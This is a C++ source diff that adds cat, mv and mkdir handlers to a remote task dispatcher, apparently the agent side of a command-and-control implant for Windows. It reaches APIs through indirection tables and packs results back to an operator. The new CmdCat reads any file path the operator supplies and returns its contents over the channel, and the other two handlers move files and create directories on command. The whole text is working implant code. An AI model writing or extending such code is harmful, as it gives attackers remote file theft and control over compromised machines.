@@ -19,7 +19,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		ULONG CommandId = inPacker->Unpack32();
 		switch ( CommandId )
 		{
-
+		case COMMAND_CAT:
+			this->CmdCat(CommandId, inPacker, outPacker); break;
+		
 		case COMMAND_CD:        
 			this->CmdCd(CommandId, inPacker, outPacker); break;
 	
@@ -37,6 +39,12 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 
 		case COMMAND_LS:
 			this->CmdLs(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_MV:
+			this->CmdMv(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_MKDIR:
+			this->CmdMkdir(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_PROFILE:
 			this->CmdProfile(CommandId, inPacker, outPacker); break;
@@ -67,6 +75,50 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 	}
 
 	MemFreeLocal((LPVOID*)&recv, recvSize);
+}
+
+void Commander::CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG pathSize = 0;
+	CHAR* path = (CHAR*)inPacker->UnpackBytes(&pathSize);
+	ULONG taskId = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+
+	HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
+	if ((!hFile) || (hFile == INVALID_HANDLE_VALUE)) {
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(TEB->LastErrorValue);
+
+		if (hFile) {
+			ApiNt->NtClose(hFile);
+			hFile = NULL;
+		}
+		return;
+	}
+
+	DWORD contentSize = 2048;
+	DWORD readed = 0;
+	PVOID content = MemAllocLocal(contentSize);
+
+	bool result = ApiWin->ReadFile(hFile, content, contentSize, &readed, NULL);
+	if (result) {
+		outPacker->Pack32(commandId);
+		outPacker->PackBytes((PBYTE)path, pathSize);
+		outPacker->PackBytes((PBYTE)content, readed);
+	}
+	else {
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(TEB->LastErrorValue);
+	}
+
+	if (hFile) {
+		ApiNt->NtClose(hFile);
+		hFile = NULL;
+	}
+
+	if (content)
+		MemFreeLocal(&content, contentSize);
 }
 
 void Commander::CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -273,6 +325,45 @@ void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(TEB->LastErrorValue);
 	}
 
+}
+
+void Commander::CmdMkdir(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG pathSize = 0;
+	CHAR* path = (CHAR*)inPacker->UnpackBytes(&pathSize);
+	ULONG taskId = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+
+	BOOL result = ApiWin->CreateDirectoryA(path, NULL);
+	if (result) {
+		outPacker->Pack32(commandId);
+		outPacker->PackBytes((PBYTE)path, pathSize);
+	}
+	else {
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(TEB->LastErrorValue);
+	}
+}
+
+void Commander::CmdMv(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG srcSize = 0;
+	CHAR* src = (CHAR*)inPacker->UnpackBytes(&srcSize);
+	ULONG dstSize = 0;
+	CHAR* dst = (CHAR*)inPacker->UnpackBytes(&dstSize);
+	ULONG taskId = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+
+	BOOL result = ApiWin->MoveFileA(src, dst);
+	if (result) {
+		outPacker->Pack32(commandId);
+	}
+	else {
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(TEB->LastErrorValue);
+	}
 }
 
 void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
